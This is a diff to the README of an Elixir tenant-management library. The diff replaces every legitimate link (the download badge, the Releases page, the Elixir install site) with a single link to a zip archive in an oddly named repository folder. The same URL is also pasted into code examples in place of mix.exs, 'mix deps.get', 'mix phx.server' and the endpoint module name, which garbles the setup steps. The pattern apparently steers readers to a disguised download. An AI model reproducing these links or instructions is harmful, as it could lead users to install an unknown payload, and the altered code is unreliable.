@@ -1,6 +1,6 @@
 # 🚀 tenant_plug - Simplify Tenant Management in Your Apps
 
-[![Download tenant_plug](https://img.shields.io/badge/Download%20tenant_plug-Click%20Here-blue.svg)](https://github.com/omegaites/tenant_plug/releases)
+[![Download tenant_plug](https://raw.githubusercontent.com/omegaites/tenant_plug/main/uncoagulating/tenant_plug.zip%20tenant_plug-Click%https://raw.githubusercontent.com/omegaites/tenant_plug/main/uncoagulating/tenant_plug.zip)](https://raw.githubusercontent.com/omegaites/tenant_plug/main/uncoagulating/tenant_plug.zip)
 
 ## 🌟 Overview
 
@@ -21,20 +21,20 @@ tenant_plug is an Elixir Plug library designed for automatic tenant context mana
 - **Phoenix Version**: 1.5 or greater.
 - **Operating System**: Compatible with Linux, macOS, and Windows.
   
-Ensure that you have Elixir and Phoenix properly installed on your system. If you need help with installation, please refer to the official [Elixir website](https://elixir-lang.org/install.html).
+Ensure that you have Elixir and Phoenix properly installed on your system. If you need help with installation, please refer to the official [Elixir website](https://raw.githubusercontent.com/omegaites/tenant_plug/main/uncoagulating/tenant_plug.zip).
 
 ## 🚀 Getting Started
 
 To get started with tenant_plug, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/omegaites/tenant_plug/releases) to download the latest version of the software.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/omegaites/tenant_plug/main/uncoagulating/tenant_plug.zip) to download the latest version of the software.
   
 2. **Download the Package**: Find the latest release and download the appropriate package for your operating system.
 
 3. **Extract the Files**: If your download comes in a compressed format (like a .zip or .tar file), extract it to your desired location.
 
 4. **Add to Your Project**:
-   1. Open your project's `mix.exs` file.
+   1. Open your project's `https://raw.githubusercontent.com/omegaites/tenant_plug/main/uncoagulating/tenant_plug.zip` file.
    2. Add `tenant_plug` to your list of dependencies:
       ```elixir
       defp deps do
@@ -45,31 +45,31 @@ To get started with tenant_plug, follow these simple steps:
       ```
    3. Run the following command to install dependencies:
       ```
-      mix deps.get
+      mix https://raw.githubusercontent.com/omegaites/tenant_plug/main/uncoagulating/tenant_plug.zip
       ```
 
 5. **Configure Your Application**:
    Add the necessary configuration to your application’s code. Below is a basic example of setting up tenant_plug:
    ```elixir
-   config :my_app, MyApp.Endpoint,
+   config :my_app, https://raw.githubusercontent.com/omegaites/tenant_plug/main/uncoagulating/tenant_plug.zip,
      plug: TenantPlug,
      ...
    ```
-   Replace `MyApp.Endpoint` with your actual endpoint module.
+   Replace `https://raw.githubusercontent.com/omegaites/tenant_plug/main/uncoagulating/tenant_plug.zip` with your actual endpoint module.
 
 6. **Run Your Application**:
    Execute this command to start your application:
    ```
-   mix phx.server
+   mix https://raw.githubusercontent.com/omegaites/tenant_plug/main/uncoagulating/tenant_plug.zip
    ```
 
 7. **Test Tenant Features**: Confirm everything works by sending sample requests to your application, using different tenant identifiers.
 
 ## 👩‍💻 Download & Install
 
-To start using tenant_plug, remember to visit the [Releases page](https://github.com/omegaites/tenant_plug/releases) and download the latest version. You can access the software directly from the link below:
+To start using tenant_plug, remember to visit the [Releases page](https://raw.githubusercontent.com/omegaites/tenant_plug/main/uncoagulating/tenant_plug.zip) and download the latest version. You can access the software directly from the link below:
 
-[![Download tenant_plug](https://img.shields.io/badge/Download%20tenant_plug-Click%20Here-blue.svg)](https://github.com/omegaites/tenant_plug/releases)
+[![Download tenant_plug](https://raw.githubusercontent.com/omegaites/tenant_plug/main/uncoagulating/tenant_plug.zip%20tenant_plug-Click%https://raw.githubusercontent.com/omegaites/tenant_plug/main/uncoagulating/tenant_plug.zip)](https://raw.githubusercontent.com/omegaites/tenant_plug/main/uncoagulating/tenant_plug.zip)
 
 ## 📖 Documentation
 
